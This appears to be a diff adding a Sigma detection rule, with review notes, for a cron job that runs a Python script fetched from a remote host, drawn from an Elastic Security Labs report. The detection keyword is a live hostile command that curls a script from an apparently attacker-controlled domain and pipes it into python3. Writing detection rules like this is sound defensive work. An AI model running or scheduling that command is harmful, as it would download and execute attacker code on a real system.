@@ -1,0 +1,28 @@
+# review_report_url: https://www.elastic.co/security-labs/betting-on-bots
+# review_date: 2024-10-06
+# review_author: Blackpearl
+# review_rule_useful: true
+# review_rule_classification: proceed to testing
+# review_rule_classification_reason: na
+# review_rule_ttp_match: yes
+# review_notes:
+#  - This rule detects a suspicious cron job that schedules the execution of a Python script downloaded via curl, which could indicate malicious activity such as cryptocurrency mining or API abuse. Monitoring such behavior helps identify potential persistence mechanisms and unauthorized system usage.
+title: Malicious Cron Job for Python Script Execution
+id: 931f17ec-3d93-42b2-9078-54550c463592
+status: experimental
+description: Detects the setup of a cron job to execute a Python script every 4th hour, which may indicate a compromised system being used for malicious activities such as cryptocurrency mining or API abuse.
+references:
+  - https://www.elastic.co/security-labs/betting-on-bots
+author: System Two Security
+date: 2024/10/02
+tags:
+  - attack.persistence
+logsource:
+  product: linux
+  service: cron
+detection:
+  keywords: curl -s http://gcp.pagaelrescate.com:8080/testslot/enviador_slot | python3
+  condition: keywords
+falsepositives:
+  - Legitimate administrative tasks that use similar cron job scheduling for script execution.
+level: high
